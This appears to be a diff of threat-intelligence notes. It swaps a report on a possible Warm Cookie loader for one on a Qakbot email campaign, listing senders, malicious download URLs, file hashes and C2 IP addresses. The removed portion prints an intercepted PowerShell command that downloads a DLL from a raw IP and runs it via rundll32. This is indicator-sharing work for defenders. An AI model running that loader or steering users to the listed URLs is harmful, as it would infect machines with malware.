@@ -1,48 +1,121 @@
-TLP: AMBER - No Attribution
-THREAT IDENTIFICATION: UNKNOWN - POSSIBLE WARM COOKIE
+THREAT IDENTIFICATION:  QAKBOT
 
-PDF FILE HASHES
-Attachment_556081622-005.pdf
-b1d446811b9484bb907092b5bbc06658
-SHA1: 1757f30a5ba1267c8144502c2d839e25c4034749
-SHA256: c36749f11be375b6f103ff973255b6d32ed816ba27c158adea087de7546045da
+ANALYST NOTES
+This is from the first of 2 Qakbot campaigns that I saw today.
+The email continues to use stolen email threads.
+Instead of having a .zip file attachment, the email just refers to a couple of urls.
+These urls are just text-based (no hyperlinks) and contain Latin folder names.
+Visiting the urls will download a .zip file that contains an .xls file.
+All of these maldoc filenames begin with "chat-" + a 9 digit string starting with the number 4.
+The .xls file theme is green and white and it reads: "This document protected by Microsoft Office".
+The author on all .xls files is: Админ.
+
+SUBJECTS OBSERVED
+All subjects were from stolen email threads.
+
+SENDERS OBSERVED
+APerseghin@HCHMD.ORG
+BWesson@libbyasbestos.org
+A.Balanescu@nhoh.com
+
+ZIP FILE REDIRECT URLS
+http://aips.com.au/facerequaerat/etsit-2521362
+http://beaconsfieldpistol.org.au/expeditavoluptas/etin-2211561
+http://beaconsfieldpistol.org.au/expeditavoluptas/quaeut-1663580
+http://dev3.mybeautyexchange.com/fugitmaiores/doloremmolestiae-1663579
+http://ordermyfood.mydemosystems.com/magnamimpedit/debitisomnis-1663581
+http://pragati5.mydemosystems.com/quaeratconsequatur/distinctionostrum-2521362
+http://pragati5.mydemosystems.com/quaeratconsequatur/quiquidem-1663581
+http://puhek.slovenijanet.com/doloremqueplaceat/debitisdistinctio-1663580
+http://puhek.slovenijanet.com/doloremqueplaceat/providentet-2211561
 
 ZIP FILE DOWNLOAD URLS
-https://quote.checkfedexexp.com/managements?16553a25e45250a41fd5&endeds=MIGpq&JStx=59bf050d37df88a9-ade43358-eaa1220b-0571422b-0f33e6aa150e86bafd0ed4&Ld=9d7502d88d752a27b1d00587309184b5a215
-https://reports.checkfedexexp.com/dashboard?578907ea682d95dbd2a4&report=KztAz&TMOG=6cef2a22e48036af-0c6bd72d-5406b80d-ce0f4d58-50b5eddc4875c7877d4452&lD=2b01636929c5fe78c71dc5c1967777868ade
+http://aips.com.au/facerequaerat/charts-2866750997.zip
+https://beaconsfieldpistol.org.au/expeditavoluptas/charts-2866750997.zip
+https://dev3.mybeautyexchange.com/fugitmaiores/charts-2866750997.zip
+https://ordermyfood.mydemosystems.com/magnamimpedit/charts-2866750997.zip
+https://pragati5.mydemosystems.com/quaeratconsequatur/charts-2866750997.zip
+https://puhek.slovenijanet.com/doloremqueplaceat/charts-2866750997.zip
+
+aips.com.au
+beaconsfieldpistol.org.au
+mybeautyexchange.com
+mydemosystems.com
+slovenijanet.com
 
 ZIP FILE HASHES
-Invoice 713996938_006.zip
-3ada46f5e81ed4a416d7ce35905c78e5
-SHA1: 449a5e2097d781931b9e880deddab0404e99a6bf
-SHA256: 9bb164f5851e73699f04fe5ea62e196f0dcc4952c80f899e61b551cba5fad1f4
+1cac720fe7d0179b017014d19049201f
+2750c6e95e8039575c1fe909bb283d14
+966cd58e7a9cc3481f1d492600f3843a
+b8267da4a467bdc673a6f374cddcab12
+cc84ed96869d800e71dec27b5f289584
+f799fe6ff603e5222a9b150073808009
+f85afd3219a927c35328c258a48621ba
+ffcd93c4c2167bbca49af03cf38c0ed2
 
-JAVASCRIPT FILE HASHES
-Invoice-713996938-006-3244625-8680325.js
-0882c8f3bbde0efee260a2834179fba9
-SHA1: 64f6aa03a142fe62c706b71e0c3777fa08fe8461
-SHA256: 019035eab36ae35d8265f1a6fcf5c12268593b19f49df838649deab1aa47fea6
+EXCEL FILE HASHES
+0d8c8fcf16b326f1cb08f0e7a6553f9e
+2af24a9f6c29cc22e84b229d064876a5
+323dd806deb3118c36205d6df489d523
+71a026ae9fcef63bdf095f912efc7427
+78ac5bb481f003593fe9aa57620e5dca
+a9c2988c722f4e8f29494b29bbea9e54
+d3d58326a80062e0de07c00f910c387a
+f822f9321c7a23c2081bae75dae37d41
 
-FIRST INTERCEPTED POWERSHELL SCRIPT
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -c "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'http://72.5.43.29/data/e93629b052f25d25c92a4afaee51cc81' -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job"
+PAYLOAD DOWNLOAD URLS
+https://houstonmarinediesel.com/riFcZvXl/n.html
+https://arboretum-abracaral.com.ar/Ipubi8Fcp5V/n.html
+https://ritelteamindonesia.co.id/basdS1syf/n.html
 
-SECOND INTERCEPTED POWERSHELL SCRIPT
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
+PAYLOAD FILE HASHES
+n.html (test.test)
+6850a68cbe49bbf6aa3fb20dabb79f48
 
-PAYLOAD DOWNLOAD URL
-http://72.5.43.29/data/e93629b052f25d25c92a4afaee51cc81
+n.html (test1.test)
+c8c96e46ae9ad6966963d29e28bc63be
 
-EXECUTABLE FILE HASHES
-e93629b052f25d25c92a4afaee51cc81
-MD5: 7a799f4f9aa63745a75b901a392aff29
-SHA1: b9983463f637191ba12c2270ac52a547676a7037
-SHA256: f4d2c9470b322af29b9188a3a590cbe85bacb9cc8fcd7c2e94d82271ded3f659
-(This is a DLL file)
+n.html (test2.test)
+ca6ec472847da2293ea37e230977956c
 
-OBSERVED C2 TRAFFIC
-None
+QAKBOT C2s
+https://140.82.49.12/t4
+https://185.107.66.221/t4
+https://70.93.80.154/t4
+https://72.252.201.69:465/t4
+https://87.99.107.124/t4
+https://89.101.97.139/t4
 
-STRINGS FROM THE BINARY
-E:\work\ooooooops\181\knock_v1.1.8\knock\bin64\knock.pdb
-
-
+OTHER OBSERVED TLS TRAFFIC (LIKELY BUT NOT CERTAIN C2s)
+https://103.143.8.71
+https://115.96.64.9:995
+https://136.232.34.70
+https://176.78.108.235
+https://185.53.147.51
+https://189.218.20.252
+https://189.223.33.109
+https://196.207.140.40:995
+https://216.201.162.158
+https://216.238.71.31
+https://216.238.72.121:995
+https://39.49.31.210:995
+https://5.224.28.151:995
+https://68.186.192.69
+https://72.252.201.69:995
+https://73.151.236.31
+https://73.25.109.183:2222
+https://75.188.35.168
+https://75.66.88.33
+https://77.79.56.210
+https://78.191.49.39:995
+https://85.54.179.210:2222
+https://86.173.96.126
+https://86.8.177.143
+https://86.97.8.204
+https://88.253.105.24
+https://89.137.52.44
+https://89.38.183.229
+https://92.59.35.196:2222
+https://94.110.12.148:995
+https://94.200.181.154
+https://94.60.254.81
